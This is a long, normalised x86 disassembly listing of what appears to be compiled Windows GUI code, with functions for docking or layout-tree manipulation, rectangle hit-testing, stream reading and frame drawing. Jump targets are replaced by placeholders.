mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43d6a8
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_43dcac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403134
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403470
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d654
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb18
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_424ba4
mov edx eax
mov eax ebx
call sub_41fc94
mov eax [ ebp - 0x4 ]
call sub_43de7c
xor eax eax
push ebp
push sub_43ddb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_438618
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_43d888
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ddbf
mov eax [ ebp - 0x4 ]
call sub_43de80
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4385dc
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_43ddbf
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_43fc50
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43de14
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_43ee80
mov eax [ esi + 0x10 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_43de94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_43de94
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_43de94
pop ecx
sub_43deec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_43de94
pop ecx
sub_43df18
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43df18
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43df18
pop ecx
sub_43df6c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_43deec
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43d7d8
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_43d7d8
push eax
mov edx 0x1
mov eax ebx
call sub_43d76c
push eax
mov edx 0x2
mov eax ebx
call sub_43d76c
pop edx
pop ecx
call sub_41570c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b78
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43dff0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_43da28
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_41570c
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434acc
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d654
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_43deec
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_43d678
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_43ef18
mov edx esi
mov eax ebx
call sub_43deec
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_4350b0
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d654
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43509c
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_43d7d8
mov edx eax
mov eax edi
call sub_43dbc8
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_43d7d8
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_43d7d8
mov edx eax
mov eax edi
call sub_43dbc8
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_43d7d8
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43e200
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43e3a8
jmp r-xdata
sub_43e200
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d654
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_43dba0
mov edx eax
mov eax ebx
call sub_43dbc8
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_43dbc8
mov eax [ esi + 0x64 ]
call sub_43dba0
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_43f270
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43df54
mov eax [ esi + 0x64 ]
call sub_43dba0
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_43f270
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43df54
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_43f5f4
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43df54
mov eax [ esi + 0x64 ]
call sub_43dba0
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_43f728
xor edx edx
mov eax esi
call sub_43df54
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_43dbc8
adc edx 0x0
mov eax ebx
call sub_43d888
mov eax ebx
call sub_43dc18
push esi
push sub_43f728
xor edx edx
mov eax esi
call sub_43df54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_43e3a8
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_43d888
mov eax [ ebx + 0x14 ]
call sub_43dc18
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_43e420
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_43dba0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_43dba0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_43dba0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43d76c
mov esi eax
mov edx 0x2
mov eax ebx
call sub_43d76c
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_43dba0
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_43dc78
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43dca0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43dc78
call sub_43e420
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43dca0
call sub_43e420
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_43d7d8
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_43d7d8
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_43e64c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_438618
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_4385dc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_4156bc
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e6e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_43e64c
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43dca0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43deec
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_43dca0
call sub_43e420
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_43e768
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403e9c
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4044e8
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_43e7b0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43e9a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_43ee80
mov eax [ ebp - 0x8 ]
call sub_43de7c
xor edx edx
push ebp
push sub_43e98b
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e992
mov eax [ ebp - 0x8 ]
call sub_43de80
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d654
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_43e768
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403360
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43d974
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_43e768
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43502c
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_435e00
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403164
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_43e9b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_4156e4
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4203c0
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ea10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41f9e0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_42013c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_4200dc
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_4200dc
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41f9e0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_4200dc
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4200dc
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43ea98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_43e9b8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_43ea10
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_43ea10
pop ecx
